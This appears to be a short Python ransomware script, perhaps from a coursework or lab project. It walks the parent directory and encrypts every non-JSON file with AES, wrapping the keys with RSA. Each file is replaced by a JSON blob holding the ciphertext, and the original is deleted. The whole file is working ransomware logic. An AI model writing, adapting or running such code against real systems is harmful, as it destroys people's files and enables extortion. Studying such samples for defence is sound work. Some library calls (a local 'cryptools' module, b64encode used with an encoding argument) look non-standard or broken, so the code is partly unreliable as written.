from base64 import b64encode, b64decode
import os, json, requests, cryptools, constants

HMAC_KEY = os.urandom(constants.HMAC_KEY_LENGTH)

AES_KEY = os.urandom(constants.AES_KEY_LENGTH)

INITIALIZATION_VECTOR = os.urandom(constants.IV_LENGTH)

OUTSIDE_DIRECTORY = ".."

CIPHER = cryptools.RSAEncryptor()

def AESEncrypt(plaintext):
    cipher = cryptools.FileEncryptor(AES_KEY, INITIALIZATION_VECTOR)
    padded_text = cryptools.pad(plaintext)
    return cipher.update(padded_text) + cipher.finalize()

def RSAEncrypt(plaintext):
    return CIPHER.encrypt(
        plaintext,
        cryptools.oaep()
    ) 

for current_directory, sub_directories, sub_files in os.walk(OUTSIDE_DIRECTORY):
    if 'ransomware' in current_directory.lower():
        continue

    for file in sub_files:
        if 'json' in file:
            continue
        fileName = ''.join(file.split('.')[:-1])

        ext = file.split('.')[-1]

        if len(file.split('.')) == 0 or file.endswith('json'):
            continue

        json_dict = dict()

        with open(os.path.join(current_directory, file), 'rb') as f:
            ciphertext = AESEncrypt(f.read())

        tag = cryptools.HMAC(ciphertext, HMAC_KEY)

        encrypted_keys = RSAEncrypt(AES_KEY + HMAC_KEY)
        
        json_dict['IV'] = b64encode(INITIALIZATION_VECTOR)
        json_dict['KEY'] = b64encode(encrypted_keys)
        json_dict['TAG'] = b64encode(tag)
        json_dict['EXT'] = b64encode(ext, 'utf-8')
        json_dict['CIPHERTEXT'] = b64encode(ciphertext)

        with open(os.path.join(current_directory, fileName + '.json'), 'w') as json_file:
            json.dump(json_dict, json_file)

        os.remove(os.path.join(current_directory, file))
